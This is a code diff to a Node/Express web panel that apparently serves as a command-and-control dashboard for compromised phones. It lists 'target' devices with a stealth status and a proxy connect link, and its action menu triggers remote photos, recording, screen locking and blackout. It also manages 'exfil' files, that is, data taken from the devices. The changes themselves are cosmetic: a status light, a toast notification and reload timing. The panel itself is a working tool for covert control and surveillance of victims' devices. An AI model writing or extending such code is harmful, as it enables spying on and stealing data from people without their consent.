@@ -444,6 +444,11 @@ app.get('/', (req, res) => {
                 statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
             }
 
+            const isAnyActive = d.blackout || d.locked || d.flashlight || d.recording;
+            const dropdownGreenLight = isAnyActive ?
+                '<span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 10px var(--neon-green), 0 0 20px var(--neon-green);" title="Action Active / Running"></span>' :
+                '';
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -460,7 +465,7 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 6px;">
+                    <div style="display: inline-flex; align-items: center; gap: 8px;">
                         <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
                         <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                             <option value="" disabled selected>⚡ ACTIONS</option>
@@ -471,6 +476,7 @@ app.get('/', (req, res) => {
                             <option value="volume">🔊 Max Vol + Vibrate</option>
                             <option value="photo">📷 Quick Photo (Rear)</option>
                         </select>
+                        ${dropdownGreenLight}
                     </div>
                 </td>
             </tr>
@@ -582,6 +588,28 @@ app.get('/', (req, res) => {
         </div>
     </div>
     <script>
+    function showToast(e, t = "info") {
+      let o = document.getElementById("c2-toast");
+      if (!o) {
+        o = document.createElement("div");
+        o.id = "c2-toast";
+        o.style.cssText = "position: fixed; bottom: 15%; left: 50%; transform: translateX(-50%); background: rgba(15,15,25,0.98); border: 1px solid var(--neon-cyan); color: #fff; padding: 16px 32px; border-radius: 12px; z-index: 10000; font-size: 0.9rem; text-align: center; min-width: 320px; box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0; display: none; font-family: Orbitron, sans-serif; letter-spacing: 1px;";
+        document.body.appendChild(o);
+      }
+      o.style.borderColor = (t === "error") ? "var(--danger)" : "var(--neon-cyan)";
+      o.innerHTML = e;
+      o.style.display = "block";
+      setTimeout(() => {
+        o.style.opacity = "1";
+        o.style.bottom = "20%";
+      }, 10);
+      setTimeout(() => {
+        o.style.opacity = "0";
+        o.style.bottom = "15%";
+        setTimeout(() => o.style.display = "none", 300);
+      }, 3800);
+    }
+
     function renameDevice(deviceId, currentAlias) {
         const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
         if (newName !== null) {
@@ -594,7 +622,7 @@ app.get('/', (req, res) => {
             .then(data => {
                 if (data.success) {
                     showToast("DEVICE_RENAMED");
-                    setTimeout(() => location.reload(), 1000);
+                    setTimeout(() => location.reload(), 800);
                 } else {
                     showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
                 }
@@ -633,12 +661,13 @@ app.get('/', (req, res) => {
         fetch(fullUrl)
             .then(r => {
                 if (r.ok) {
-                    showToast('[DISPATCH_SUCCESS] ' + label + ' executed.');
+                    showToast('[DISPATCH_SUCCESS] Command "' + label + '" executed.');
+                    setTimeout(() => location.reload(), 800);
                 } else {
                     showToast('Dispatch failed (Status ' + r.status + ')', 'error');
                 }
             })
-            .catch(err => showToast('Network error dispatching command', 'error'));
+            .catch(err => showToast('Network error dispatching command.', 'error'));
     }
 
     function deleteExfil(id) {
@@ -652,7 +681,7 @@ app.get('/', (req, res) => {
             .then(data => {
                 if (data.success) {
                     showToast("PAYLOAD_DELETED");
-                    setTimeout(() => location.reload(), 1000);
+                    setTimeout(() => location.reload(), 800);
                 } else {
                     showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
                 }
